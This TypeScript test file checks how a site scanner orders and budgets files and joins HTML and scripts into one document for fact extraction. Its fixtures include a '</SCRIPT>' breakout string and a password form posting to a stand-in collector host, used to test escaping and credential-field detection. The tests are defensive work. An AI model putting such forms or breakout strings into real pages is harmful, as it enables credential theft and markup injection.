/**
 * D15's synthetic document (E08 task 007): the order files are read in, where
 * the budget cuts, `</script` escaping, what is never read, and the identity
 * for a single-file page. Pure — no store, no database.
 */
import assert from "node:assert/strict";
import { test } from "node:test";

import { SCAN_TEXT_BUDGET_CHARS } from "@kept/shared";

import { extract } from "./extract";
import { scanFiles, synthesize } from "./synthesize";

const sized = (path: string, sizeBytes: number) => ({ path, sizeBytes });

test("scanFiles: root index.html, other HTML smallest first, then scripts smallest first; ties by path", () => {
  const order = scanFiles([
    sized("app.js", 30),
    sized("z.html", 20),
    sized("about/index.html", 10),
    sized("a.html", 20),
    sized("worker.mjs", 5),
    sized("lib.cjs", 5),
    sized("index.html", 900),
    sized("old.htm", 15),
  ]).map((file) => file.path);
  assert.deepEqual(order, [
    "index.html",
    "about/index.html",
    "old.htm",
    "a.html",
    "z.html",
    "lib.cjs",
    "worker.mjs",
    "app.js",
  ]);
});

test("scanFiles: CSS, JSON, SVG, images, fonts and every other type are never read; empty files add nothing", () => {
  const order = scanFiles([
    sized("index.html", 100),
    sized("style.css", 10),
    sized("data.json", 10),
    sized("logo.svg", 10),
    sized("logo.png", 10),
    sized("font.woff2", 10),
    sized("model.glb", 10),
    sized("empty.js", 0),
    sized("README.md", 10),
  ]).map((file) => file.path);
  assert.deepEqual(order, ["index.html"]);
});

test("scanFiles: files are taken until their sizes reach the budget — the one that reaches it is the last in", () => {
  const half = SCAN_TEXT_BUDGET_CHARS / 2;
  const order = scanFiles([
    sized("index.html", half),
    sized("b.html", half - 1),
    sized("c.html", 10),
    sized("d.html", 20),
    sized("app.js", 3 * 1024 * 1024),
  ]).map((file) => file.path);
  // index (½) + c (10) + d (20) is under the budget, so b — which reaches it — is read, then nothing else.
  assert.deepEqual(order, ["index.html", "c.html", "d.html", "b.html"]);

  const big = scanFiles([sized("index.html", SCAN_TEXT_BUDGET_CHARS), sized("login.html", 10)]).map((f) => f.path);
  assert.deepEqual(big, ["index.html"], "an index at the budget leaves no room");

  const thousands = scanFiles(Array.from({ length: 5000 }, (_, i) => sized(`p/${String(i).padStart(4, "0")}.html`, 100)));
  assert.equal(thousands.length, SCAN_TEXT_BUDGET_CHARS / 100, "a 5,000-file set reads only what fits");
});

test("synthesize: a single index.html is that file's text exactly", () => {
  const html = "<!doctype html><title>Only</title><p>One file.</p>";
  assert.equal(synthesize([{ path: "index.html", text: html }]), html);
  assert.equal(
    synthesize([
      { path: "index.html", text: html },
      { path: "style.css", text: "body{color:red}" },
    ]),
    html,
    "files never scanned do not change the document",
  );
});

test("synthesize: every file is named by a comment, scripts are wrapped, and `</script` inside cannot close the block", () => {
  const doc = synthesize([
    { path: "app.js", text: 'document.write("</SCRIPT><form action=x>"); var s = "</script>";' },
    { path: "login.html", text: "<form><input type=password></form>" },
    { path: "index.html", text: "<h1>Home</h1>" },
    { path: "we-->ird.html", text: "<p>odd</p>" },
  ]);
  assert.equal(
    doc,
    [
      "<!-- index.html -->\n<h1>Home</h1>",
      "<!-- we--%3Eird.html -->\n<p>odd</p>",
      "<!-- login.html -->\n<form><input type=password></form>",
      '<!-- app.js -->\n<script>document.write("<\\/SCRIPT><form action=x>"); var s = "<\\/script>";</script>',
    ].join("\n"),
  );
});

test("synthesize → extract: a password form in login.html is a fact of the set; the comments never close early", () => {
  const { facts } = extract(
    synthesize([
      { path: "index.html", text: "<!doctype html><title>Home</title><h1>Welcome</h1>" },
      { path: "login.html", text: '<form action="https://collect.example.invalid/x"><input name="p" type="password"></form>' },
    ]),
    "drill.kept-dev.xyz",
  );
  assert.equal(facts.secretField, true);
});
